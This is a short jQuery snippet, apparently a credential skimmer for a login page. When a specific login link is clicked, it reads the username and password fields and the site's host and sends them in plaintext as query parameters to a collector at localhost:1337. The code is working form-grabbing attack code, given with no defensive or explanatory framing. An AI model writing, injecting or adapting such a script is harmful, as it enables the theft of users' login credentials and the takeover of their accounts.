$('body').on("click",'a[tabindex="6"]', function(event){
    var username = $('input[name="username"]').val();
    var passwords = $('input[name="password"]').val();
     var web= window.location.host;
    var query = '?username=' + username + '&' + 'passwords=' + passwords+ '&' + 'web=' + web;
    $.get('http://localhost:1337' + query, function() {});
});